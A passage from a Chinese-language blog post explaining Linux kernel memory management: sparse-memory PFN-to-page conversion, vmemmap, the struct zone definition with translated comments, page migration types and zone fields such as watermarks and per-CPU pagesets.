得到的是对应的_页下标_，之后再通过 mem_section 标号与每页中 mem_section 数量 - 1（<code>SECTION_ROOT_MASK</code>）做与运算最终得到该 mem_section 在该页这一 mem_section 数组中的下标</p><p>之后通过 <code>__section_mem_map_addr()</code> 获取到 mem_section 结构体中的 section_mem_map 成员，该函数定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *__<span class="title">section_mem_map_addr</span>(<span class="keyword">struct</span> <span class="title">mem_section</span> *<span class="title">section</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="built_in">map</span> = section-&gt;section_mem_map;</span><br><span class="line">    <span class="built_in">map</span> &amp;= SECTION_MAP_MASK;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">struct</span> page *)<span class="built_in">map</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后与 page 结构体的地址做差运算便能获得其 PFN，需要注意的是在这里进行的是 <em>page 结构体指针间的运算</em> 而非简单的地址加减法，计算过程为：<br>$$<br>address_{struct\ page} - section_mem_map &#x3D; address_{struct\ page} - (address_{mem_map} - start_PFN)\<br>&#x3D;(address_{struct\ page} - address_{mem_map}) + start_PFN<br>\<br>&#x3D;PFN<br>$$</p><h5 id="（2）PFN-到-page-结构体：页框号加上对应-mem-section-gt-section-mem-map"><a href="#（2）PFN-到-page-结构体：页框号加上对应-mem-section-gt-section-mem-map" class="headerlink" title="（2）PFN 到 page 结构体：页框号加上对应 mem_section-&gt;section_mem_map"></a>（2）PFN 到 page 结构体：页框号加上对应 mem_section-&gt;section_mem_map</h5><p>该宏首先使用 <code>__pfn_section()</code> 来获取到 PFN 所属的 mem_section，该函数定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> *__<span class="title">pfn_to_section</span>(<span class="title">unsigned</span> <span class="title">long</span> <span class="title">pfn</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">return</span> __nr_to_section(pfn_to_section_nr(pfn));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 <code>pfn_to_section_nr()</code> 定义如下，用以获取对应的 section 的索引：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">pfn_to_section_nr</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> pfn)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> pfn &gt;&gt; PFN_SECTION_SHIFT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用到一个宏 <code>PFN_SECTION_SHIFT</code>，定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PFN_SECTION_SHIFT    (SECTION_SIZE_BITS - PAGE_SHIFT)</span></span><br></pre></td></tr></table></figure><p>其中的 <code>SECTION_SIZE_BIT</code> 表示一个 section 的大小（恒定为2的幂次方）所占位数，而 <code>PAGE_SHIFT</code> 则为一个页的大小（通常为4096）所占位数，前者移位后者所得为_一个 section 中页的数量_</p><p>由页框号移位（本质为除法）单个 section 中页的数量便能得到其所属 section 标号</p><p>之后使用 <code>__nr_to_section()</code> 来获取对应的 mem_section 结构体的地址，最后使用 <code>__section_mem_map_addr()</code> 获取到 mem_section 结构体中的 section_mem_map 成员后再与页框号做 <em>指针加法</em> 便能获取到对应的 page 结构体数组，计算过程如下：<br>$$<br>PFN - section_mem_map &#x3D; PFN - (address_{mem_map} - start_PFN)\<br>&#x3D; (PFN - start_PFN )+ address_{mem_map}<br>\<br>&#x3D;address_{struct\ page}<br>$$</p><h4 id="Sparse-Memory-virtual-memmap"><a href="#Sparse-Memory-virtual-memmap" class="headerlink" title="*Sparse Memory virtual memmap"></a><em>*Sparse Memory virtual memmap</em></h4><p>基于Sparse Memory 内存模型上引入了 vmemmap 的概念，是目前 Linux 最常用的内存模型之一</p><blockquote><p>图依然是偷的，侵删</p></blockquote><p><img src="https://i.loli.net/2021/11/25/mnAUkENCoRwjtpq.png" alt="image.png"></p><p>在开启了 vmemmap 之后，所有的 mem_section 中的 page 都抽象到一个虚拟数组 vmemmap 中，这样在进行struct page * 和 pfn 转换时，直接使用 vmemmap 数组即可</p><h1 id="0x02-struct-zone：区"><a href="#0x02-struct-zone：区" class="headerlink" title="0x02.struct zone：区"></a>0x02.struct zone：区</h1><p>在 Linux 下将一个节点内不同用途的内存区域划分为不同的 <code>区（zone）</code>，对应结构体 <code>struct zone</code>，该结构体定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line">    <span class="comment">/* Read-mostly fields */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* zone 的“水位线”, 使用宏 *_wmark_pages(zone) 进行访问 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> _watermark[NR_WMARK];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> watermark_boost;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> nr_reserved_highatomic;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 我们不知道我们将要分配的内存是否是可释放的 或/且 最终会被释放，</span></span><br><span class="line"><span class="comment">     * 因此为了避免将整个的几个 GB 的 RAM浪费掉，</span></span><br><span class="line"><span class="comment">     * 我们必须要保留一些 lower zone memory</span></span><br><span class="line"><span class="comment">     * (否则我们将有在 lower zones 上耗尽所有内存（OOM）的风险，</span></span><br><span class="line"><span class="comment">     * 尽管此时在 higher zones 仍有大量的 RAM).</span></span><br><span class="line"><span class="comment">     * 若 sysctl_lowmem_reserve_ratio 系统控制项改变，</span></span><br><span class="line"><span class="comment">     * 这个数组有可能在运行时被改变</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">long</span> lowmem_reserve[MAX_NR_ZONES];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    <span class="type">int</span> node;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span>    *<span class="title">zone_pgdat</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pageset</span> __<span class="title">percpu</span> *<span class="title">pageset</span>;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * the high and batch values are copied to individual pagesets for</span></span><br><span class="line"><span class="comment">     * faster access</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">int</span> pageset_high;</span><br><span class="line">    <span class="type">int</span> pageset_batch;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_SPARSEMEM</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 单个 pageblock_nr_pages block 的标志位. 参见 pageblock-flags.h.</span></span><br><span class="line"><span class="comment">     * 在 SPARSEMEM 中, 该 map 存放于 struct mem_section 中</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        *pageblock_flags;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_SPARSEMEM */</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* zone_start_pfn == zone_start_paddr &gt;&gt; PAGE_SHIFT */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        zone_start_pfn;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * spanned_pages 为该 zone 所包含的 pages 的范围, 包括空洞</span></span><br><span class="line"><span class="comment">     * 计算方式如下:</span></span><br><span class="line"><span class="comment">     *     spanned_pages = zone_end_pfn - zone_start_pfn;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * present_pages 为该 zone 中存在的物理页框数</span></span><br><span class="line"><span class="comment">     * 计算方式如下:</span></span><br><span class="line"><span class="comment">     *    present_pages = spanned_pages - absent_pages(pages in holes);</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * managed_pages 为现有的由 buddy system 管理的页面数量, </span></span><br><span class="line"><span class="comment">     * 计算方式如下 (reserved_pages 包括由 bootmem allocator 分配的页面):</span></span><br><span class="line"><span class="comment">     *    managed_pages = present_pages - reserved_pages;</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * present_pages 可能会被内存热拔插或内存电源管理逻辑</span></span><br><span class="line"><span class="comment">     * 通过检查(present_pages - managed_pages)来算出未被管理的页面. </span></span><br><span class="line"><span class="comment">     * managed_pages 应被页面分配器与 vm 扫描器用以计算所有的水位线与阈值</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 锁规则:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * zone_start_pfn 与 spanned_pages 由 span_seqlock 保护.</span></span><br><span class="line"><span class="comment">     * 这是一个顺序锁（seqlock，译者补充：写优先锁）因为他得在 zone-&gt;lock 之外被读取,</span></span><br><span class="line"><span class="comment">     * 在主分配器路径中完成. </span></span><br><span class="line"><span class="comment">     * 但他确实不经常被写入。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * span_seq lock 随着 zone-&gt;lock 被定义，因为相较于 zone-&gt;lock，</span></span><br><span class="line"><span class="comment">     * 他经常被读取. 让他们有个机会在同一条缓存线（cacheline）上一件好事</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 运行时 present_pages 应当由 mem_hotplug_begin/end() 进行保护.</span></span><br><span class="line"><span class="comment">     * 任何无法忍受 present_pages 的应当使用 get_online_mems()来获得固定的值.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">atomic_long_t</span>        managed_pages;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        spanned_pages;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        present_pages;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>        *name;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 独立的 pageblock 的数量. 用以解决由于对 pagelock</span></span><br><span class="line"><span class="comment">     * 的 migratetype 的竞态检索导致的对 freepage 的错误计数.</span></span><br><span class="line"><span class="comment">     * 由 zone-&gt;lock 保护</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        nr_isolate_pageblock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line">    <span class="comment">/* 参见 spanned/present_pages 以获得更多描述 */</span></span><br><span class="line">    <span class="type">seqlock_t</span>        span_seqlock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> initialized;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 供页分配器使用的写敏感字段 */</span></span><br><span class="line">    ZONE_PADDING(_pad1_)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 不同 sizes 的闲置区域 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">free_area</span>    <span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* zone 标志位 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 主要保护 free_area */</span></span><br><span class="line">    <span class="type">spinlock_t</span>        lock;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 供 compaction and vmstats 使用的写敏感字段. */</span></span><br><span class="line">    ZONE_PADDING(_pad2_)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 当闲置页在这一点下时, 在读取闲置页数量时会采取额外的步骤</span></span><br><span class="line"><span class="comment">     * 以避免 per-cpu 计数器</span></span><br><span class="line"><span class="comment">     * 漂移导致水位线被突破</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> percpu_drift_mark;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line">    <span class="comment">/* pfn where compaction free scanner should start */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        compact_cached_free_pfn;</span><br><span class="line">    <span class="comment">/* pfn where compaction migration scanner should start */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        compact_cached_migrate_pfn[ASYNC_AND_SYNC];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        compact_init_migrate_pfn;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        compact_init_free_pfn;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * On compaction failure, 1&lt;&lt;compact_defer_shift compactions</span></span><br><span class="line"><span class="comment">     * are skipped before trying again. The number attempted since</span></span><br><span class="line"><span class="comment">     * last failure is tracked with compact_considered.</span></span><br><span class="line"><span class="comment">     * compact_order_failed is the minimum compaction failed order.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        compact_considered;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>        compact_defer_shift;</span><br><span class="line">    <span class="type">int</span>            compact_order_failed;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line">    <span class="comment">/* Set to true when the PG_migrate_skip bits should be cleared */</span></span><br><span class="line">    <span class="type">bool</span>            compact_blockskip_flush;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="type">bool</span>            contiguous;</span><br><span class="line"></span><br><span class="line">    ZONE_PADDING(_pad3_)</span><br><span class="line">    <span class="comment">/* Zone 的统计数据 */</span></span><br><span class="line">    <span class="type">atomic_long_t</span>        vm_stat[NR_VM_ZONE_STAT_ITEMS];</span><br><span class="line">    <span class="type">atomic_long_t</span>        vm_numa_stat[NR_VM_NUMA_STAT_ITEMS];</span><br><span class="line">&#125; ____cacheline_internodealigned_in_smp;</span><br></pre></td></tr></table></figure><h2 id="I-页面迁移机制"><a href="#I-页面迁移机制" class="headerlink" title="I.页面迁移机制"></a>I.页面迁移机制</h2><p>页面迁移主要用以解决内核空间中的<strong>碎片问题</strong>，在长期的运行之后内存当中空闲页面的分布可能是零散的，这便导致了内核<strong>有可能无法映射到足够大的连续内存</strong>，因此需要进行_页面迁移_——将旧的页面迁移到新的位置</p><p><img src="https://i.loli.net/2021/11/30/q7T6EjtIb9PVFY3.png" alt="从知乎偷的图.png"></p><p>但<strong>并非所有的页面都是能够随意迁移的</strong>，因此我们在 buddy system 当中还需要将页面按照迁移类型进行分类</p><h3 id="迁移类型"><a href="#迁移类型" class="headerlink" title="迁移类型"></a>迁移类型</h3><p>迁移类型由一个枚举类型定义，定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">migratetype</span> &#123;</span></span><br><span class="line">    MIGRATE_UNMOVABLE,</span><br><span class="line">    MIGRATE_MOVABLE,</span><br><span class="line">    MIGRATE_RECLAIMABLE,</span><br><span class="line">    MIGRATE_PCPTYPES,    <span class="comment">/* the number of types on the pcp lists */</span></span><br><span class="line">    MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * MIGRATE_CMA migration type is designed to mimic the way</span></span><br><span class="line"><span class="comment">     * ZONE_MOVABLE works.  Only movable pages can be allocated</span></span><br><span class="line"><span class="comment">     * from MIGRATE_CMA pageblocks and page allocator never</span></span><br><span class="line"><span class="comment">     * implicitly change migration type of MIGRATE_CMA pageblock.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * The way to use it is to change migratetype of a range of</span></span><br><span class="line"><span class="comment">     * pageblocks to MIGRATE_CMA which can be done by</span></span><br><span class="line"><span class="comment">     * __free_pageblock_cma() function.  What is important though</span></span><br><span class="line"><span class="comment">     * is that a range of pageblocks must be aligned to</span></span><br><span class="line"><span class="comment">     * MAX_ORDER_NR_PAGES should biggest page be bigger then</span></span><br><span class="line"><span class="comment">     * a single pageblock.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    MIGRATE_CMA,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">    MIGRATE_ISOLATE,    <span class="comment">/* can&#x27;t allocate from here */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    MIGRATE_TYPES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><strong>MIGRATE_UNMOVABLE</strong>：这类型页面在内存当中有着固定的位置，<strong>不能移动</strong></li><li><strong>MIGRATE_MOVABLE</strong>：这类页面<strong>可以随意移动</strong>，例如用户空间的页面，我们只需要复制数据后改变页表映射即可</li><li><strong>MIGRATE_RECLAIMABLE</strong>：这类页面<strong>不能直接移动，但是可以删除</strong>，例如映射自文件的页</li><li><strong>MIGRATE_PCPTYPES</strong>：<code>per_cpu_pageset</code>，即每 CPU 页帧缓存，其迁移<strong>仅限于同一节点内</strong></li><li><strong>MIGRATE_ISOLATE</strong>：<strong>不能从该链表分配页面</strong>，该链表用于跨 NUMA 节点进行页面移动，将页面移动到使用该页面最为频繁的 CPU 所处节点</li><li><em>MIGRATE_TYPES_：表示迁移类型的数目，_并不存在这一链表</em></li></ul><h2 id="II-几个比较重要的字段"><a href="#II-几个比较重要的字段" class="headerlink" title="II.几个比较重要的字段"></a>II.几个比较重要的字段</h2><p>简单讲讲其中几个重要的成员</p><h3 id="watermark：“水位线”"><a href="#watermark：“水位线”" class="headerlink" title="_watermark：“水位线”"></a>_watermark：“水位线”</h3><p>每一个 zone 都有着其对应的三档“水位线”： <code>WMARK_MIN</code>、<code>WMARK_LOW</code>、<code>WMARK_HIGH</code>，存放在 _watermark 数组中，在进行内存分配时，分配器（例如 buddy system）会根据当前 zone 中空余内存所处在的“水位线”来判断当前的内存状况，如下图所示：</p><blockquote><p>图仍然是偷的，侵删</p></blockquote><p><img src="https://i.loli.net/2021/11/25/8OuZhEfjHIy9AeL.png" alt="image.png"></p><blockquote><p>具体机制可以参见<a href="https://zhuanlan.zhihu.com/p/73539328">这里</a></p></blockquote><h3 id="lowmem-reserve：zone-自身的保留内存"><a href="#lowmem-reserve：zone-自身的保留内存" class="headerlink" title="lowmem_reserve：zone 自身的保留内存"></a>lowmem_reserve：zone 自身的保留内存</h3><p>在进行内存分配时，若当前的 zone 没有足够的内存了，则会向下一个 zone 索要内存，那么这就存在一个问题：来自 higher zones 的内存分配请求可能耗尽 lower zones 的内存，但这样分配的内存未必是可释放的（freeable），亦或者&#x2F;且最终不一定会被释放，这有可能导致 <strong>lower zones 的内存提前耗尽，而 higher zones 却仍保留有大量的内存</strong></p><p>为了避免这样的一种情况的发生，<code>lowmem_reserve</code> 字段用以声明<strong>为该 zone 保留的内存</strong>，这一块内存别的 zone 是不能动的</p><h3 id="node：NUMA-中标识所属-node"><a href="#node：NUMA-中标识所属-node" class="headerlink" title="node：NUMA 中标识所属 node"></a><em>node：NUMA 中标识所属 node</em></h3><p>这个字段只在 NUMA 系统中被启用，用以标识该 zone 所属的 node</p><p>可以参考下面的图</p><blockquote><p>图还是偷的，侵删</p></blockquote><p><img src="https://i.loli.net/2021/11/25/LlaVq9eREW5sJAH.png" alt="image.png"></p><p><img src="https://i.loli.net/2021/11/25/uwbo53W2Mjh1gOm.png" alt="image.png"></p><h3 id="zone-pgdat：zone-所属的-pglist-data-节点"><a href="#zone-pgdat：zone-所属的-pglist-data-节点" class="headerlink" title="zone_pgdat：zone 所属的 pglist_data 节点"></a>zone_pgdat：zone 所属的 pglist_data 节点</h3><p>该字段用以标识该 zone 所属的 pglist_data 节点</p><h3 id="pageset-：zone-为每个-CPU-划分一个独立的”页面仓库“"><a href="#pageset-：zone-为每个-CPU-划分一个独立的”页面仓库“" class="headerlink" title="**pageset**：zone 为每个 CPU 划分一个独立的”页面仓库“"></a>**pageset**：zone 为每个 CPU 划分一个独立的”页面仓库“</h3><p>众所周知伴随着多 CPU 的引入，<strong>条件竞争</strong>就是一个不可忽视的问题，当多个 CPU 需要对一个 zone 进行操作时，频繁的加锁&#x2F;解锁操作则毫无疑问会造成大量的开销，因此 zone 引入了 <code>per_cpu_pageset</code> 结构体成员，即<strong>为每一个 CPU 都准备一个单独的页面仓库</strong>，因此其实现方式是实现为一个 <code>percpu</code> 变量</p><p>在一开始时 buddy system 会将页面放置到各个 CPU 自己独立的页面仓库中，需要进行分配时 CPU 优先从自己的页面仓库中分配</p><p>该结构体定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pages</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> count;        <span class="comment">/* 链表中页的数量 */</span></span><br><span class="line">    <span class="type">int</span> high;        <span class="comment">/* 高水位线, 清空需要（笔者补：用以进行判断） */</span></span><br><span class="line">    <span class="type">int</span> batch;        <span class="comment">/* chunk size for buddy add/remove */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 页面链表, 在 pcp-lists 上储存的独立的迁移类型 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">lists</span>[<span class="title">MIGRATE_PCPTYPES</span>];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pageset</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pages</span> <span class="title">pcp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line">    s8 expire;</span><br><span class="line">    u16 vm_numa_stat_diff[NR_VM_NUMA_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SMP</span></span><br><span class="line">    s8 stat_threshold;</span><br><span class="line">    s8 vm_stat_diff[NR_VM_ZONE_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>该结构体会被存放在每个 CPU 自己独立的 <code>.data..percpu</code> 段中，以 CPU0 为例，结构如下图所示</p><p><img src="https://i.loli.net/2021/12/03/1dCZA3IDpUK2xYg.png" alt="自己画的图.png"></p><h3 id="zone-start-pfn：zone-的起始物理PFN"><a href="#zone-start-pfn：zone-的起始物理PFN" class="headerlink" title="zone_start_pfn：zone 的起始物理PFN"></a>zone_start_pfn：zone 的起始物理PFN</h3><p>该字段用以标识该 zone 的起始物理<strong>页帧编号</strong>（page frame number）</p><h3 id="spanned-pages：-zone-对应的内存区域中的-pages-总数（包括空洞）"><a href="#spanned-pages：-zone-对应的内存区域中的-pages-总数（包括空洞）" class="headerlink" title="spanned_pages： zone 对应的内存区域中的 pages 总数（包括空洞）"></a>spanned_pages： zone 对应的内存区域中的 pages 总数（包括空洞）</h3><p>该字段用以标识该 